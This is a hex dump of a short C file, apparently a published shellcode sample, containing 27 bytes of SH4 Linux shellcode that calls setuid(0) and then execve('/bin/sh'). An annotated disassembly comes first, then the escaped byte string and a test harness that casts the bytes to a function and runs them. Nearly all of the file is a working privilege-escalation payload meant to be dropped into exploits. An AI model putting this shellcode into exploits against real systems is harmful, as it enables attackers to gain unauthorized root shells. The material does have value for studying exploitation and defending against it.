00000000  2f 2a 0d 0a 20 20 4c 69  6e 75 78 2f 53 75 70 65  |/*..  Linux/Supe|
00000010  72 48 20 2d 20 73 68 34  20 2d 20 73 65 74 75 69  |rH - sh4 - setui|
00000020  64 28 30 29 20 3b 20 65  78 65 63 76 65 28 22 2f  |d(0) ; execve("/|
00000030  62 69 6e 2f 73 68 22 2c  20 4e 55 4c 4c 2c 20 4e  |bin/sh", NULL, N|
00000040  55 4c 4c 29 20 2d 20 32  37 20 62 79 74 65 73 0d  |ULL) - 27 bytes.|
00000050  0a 20 20 54 65 73 74 65  64 20 6f 6e 20 64 65 62  |.  Tested on deb|
00000060  69 61 6e 2d 73 68 34 20  32 2e 36 2e 33 32 2d 35  |ian-sh4 2.6.32-5|
00000070  2d 73 68 37 37 35 31 72  0d 0a 20 20 62 79 20 4a  |-sh7751r..  by J|
00000080  6f 6e 61 74 68 61 6e 20  53 61 6c 77 61 6e 20 2d  |onathan Salwan -|
00000090  20 74 77 69 74 74 65 72  3a 20 40 6a 6f 6e 61 74  | twitter: @jonat|
000000a0  68 61 6e 73 61 6c 77 61  6e 0d 0a 0d 0a 20 20 34  |hansalwan....  4|
000000b0  30 30 30 35 34 3a 20 20  20 20 20 20 20 20 31 37  |00054:        17|
000000c0  20 65 33 20 20 20 20 20  20 6d 6f 76 20 20 20 20  | e3      mov    |
000000d0  20 20 23 32 33 2c 72 33  0d 0a 20 20 34 30 30 30  |  #23,r3..  4000|
000000e0  35 36 3a 20 20 20 20 20  20 20 20 34 61 20 32 34  |56:        4a 24|
000000f0  20 20 20 20 20 20 78 6f  72 20 20 20 20 20 20 72  |      xor      r|
00000100  34 2c 72 34 0d 0a 20 20  34 30 30 30 35 38 3a 20  |4,r4..  400058: |
00000110  20 20 20 20 20 20 20 30  62 20 63 33 20 20 20 20  |       0b c3    |
00000120  20 20 74 72 61 70 61 20  20 20 20 23 31 31 0d 0a  |  trapa    #11..|
00000130  20 20 34 30 30 30 35 61  3a 20 20 20 20 20 20 20  |  40005a:       |
00000140  20 33 61 20 32 33 20 20  20 20 20 20 78 6f 72 20  | 3a 23      xor |
00000150  20 20 20 20 20 72 33 2c  72 33 0d 0a 20 20 34 30  |     r3,r3..  40|
00000160  30 30 35 63 3a 20 20 20  20 20 20 20 20 30 62 20  |005c:        0b |
00000170  65 33 20 20 20 20 20 20  6d 6f 76 20 20 20 20 20  |e3      mov     |
00000180  20 23 31 31 2c 72 33 0d  0a 20 20 34 30 30 30 35  | #11,r3..  40005|
00000190  65 3a 20 20 20 20 20 20  20 20 30 32 20 63 37 20  |e:        02 c7 |
000001a0  20 20 20 20 20 6d 6f 76  61 20 20 20 20 20 34 30  |     mova     40|
000001b0  30 30 36 38 20 3c 5f 5f  62 73 73 5f 73 74 61 72  |0068 <__bss_star|
000001c0  74 2d 30 78 31 30 30 30  38 3e 2c 72 30 0d 0a 20  |t-0x10008>,r0.. |
000001d0  20 34 30 30 30 36 30 3a  20 20 20 20 20 20 20 20  | 400060:        |
000001e0  30 33 20 36 34 20 20 20  20 20 20 6d 6f 76 20 20  |03 64      mov  |
000001f0  20 20 20 20 72 30 2c 72  34 0d 0a 20 20 34 30 30  |    r0,r4..  400|
00000200  30 36 32 3a 20 20 20 20  20 20 20 20 35 61 20 32  |062:        5a 2|
00000210  35 20 20 20 20 20 20 78  6f 72 20 20 20 20 20 20  |5      xor      |
00000220  72 35 2c 72 35 0d 0a 20  20 34 30 30 30 36 34 3a  |r5,r5..  400064:|
00000230  20 20 20 20 20 20 20 20  36 61 20 32 36 20 20 20  |        6a 26   |
00000240  20 20 20 78 6f 72 20 20  20 20 20 20 72 36 2c 72  |   xor      r6,r|
00000250  36 0d 0a 20 20 34 30 30  30 36 36 3a 20 20 20 20  |6..  400066:    |
00000260  20 20 20 20 30 62 20 63  33 20 20 20 20 20 20 74  |    0b c3      t|
00000270  72 61 70 61 20 20 20 20  23 31 31 0d 0a 20 20 34  |rapa    #11..  4|
00000280  30 30 30 36 38 3a 20 20  20 20 20 20 20 20 32 66  |00068:        2f|
00000290  20 36 32 20 20 20 20 20  20 65 78 74 73 2e 77 20  | 62      exts.w |
000002a0  20 20 72 32 2c 72 32 0d  0a 20 20 34 30 30 30 36  |  r2,r2..  40006|
000002b0  61 3a 20 20 20 20 20 20  20 20 36 39 20 36 65 20  |a:        69 6e |
000002c0  20 20 20 20 20 73 77 61  70 2e 77 20 20 20 72 36  |     swap.w   r6|
000002d0  2c 72 31 34 0d 0a 20 20  34 30 30 30 36 63 3a 20  |,r14..  40006c: |
000002e0  20 20 20 20 20 20 20 32  66 20 37 33 20 20 20 20  |       2f 73    |
000002f0  20 20 61 64 64 20 20 20  20 20 20 23 34 37 2c 72  |  add      #47,r|
00000300  33 0d 0a 20 20 34 30 30  30 36 65 3a 20 20 20 20  |3..  40006e:    |
00000310  20 20 20 20 36 38 20 30  30 20 20 20 20 20 20 2e  |    68 00      .|
00000320  77 6f 72 64 20 30 78 30  30 36 38 0d 0a 2a 2f 0d  |word 0x0068..*/.|
00000330  0a 0d 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 64  |...#include <std|
00000340  69 6f 2e 68 3e 0d 0a 23  69 6e 63 6c 75 64 65 20  |io.h>..#include |
00000350  3c 73 74 72 69 6e 67 2e  68 3e 0d 0a 0d 0a 63 68  |<string.h>....ch|
00000360  61 72 20 2a 53 43 20 3d  20 22 5c 78 31 37 5c 78  |ar *SC = "\x17\x|
00000370  65 33 5c 78 34 65 5c 78  32 34 22 0d 0a 20 20 20  |e3\x4e\x24"..   |
00000380  20 20 20 20 20 20 20 20  22 5c 78 30 62 5c 78 63  |        "\x0b\xc|
00000390  33 5c 78 33 61 5c 78 32  33 22 0d 0a 20 20 20 20  |3\x3a\x23"..    |
000003a0  20 20 20 20 20 20 20 22  5c 78 30 62 5c 78 65 33  |       "\x0b\xe3|
000003b0  5c 78 30 32 5c 78 63 37  22 0d 0a 20 20 20 20 20  |\x02\xc7"..     |
000003c0  20 20 20 20 20 20 22 5c  78 30 33 5c 78 36 34 5c  |      "\x03\x64\|
000003d0  78 35 61 5c 78 32 35 22  0d 0a 20 20 20 20 20 20  |x5a\x25"..      |
000003e0  20 20 20 20 20 22 5c 78  36 61 5c 78 32 36 5c 78  |     "\x6a\x26\x|
000003f0  30 62 5c 78 63 33 22 0d  0a 20 20 20 20 20 20 20  |0b\xc3"..       |
00000400  20 20 20 20 22 5c 78 32  66 5c 78 36 32 5c 78 36  |    "\x2f\x62\x6|
00000410  39 5c 78 36 65 22 0d 0a  20 20 20 20 20 20 20 20  |9\x6e"..        |
00000420  20 20 20 22 5c 78 32 66  5c 78 37 33 5c 78 36 38  |   "\x2f\x73\x68|
00000430  22 3b 20 0d 0a 0d 0a 76  6f 69 64 20 6d 61 69 6e  |"; ....void main|
00000440  28 76 6f 69 64 29 0d 0a  7b 0d 0a 20 20 66 70 72  |(void)..{..  fpr|
00000450  69 6e 74 66 28 73 74 64  6f 75 74 2c 20 22 4c 65  |intf(stdout, "Le|
00000460  6e 67 74 68 3a 20 25 64  5c 6e 22 2c 20 73 74 72  |ngth: %d\n", str|
00000470  6c 65 6e 28 53 43 29 29  3b 0d 0a 20 20 28 2a 28  |len(SC));..  (*(|
00000480  76 6f 69 64 28 2a 29 28  29 29 20 53 43 29 28 29  |void(*)()) SC)()|
00000490  3b 0d 0a 7d                                       |;..}|
00000494
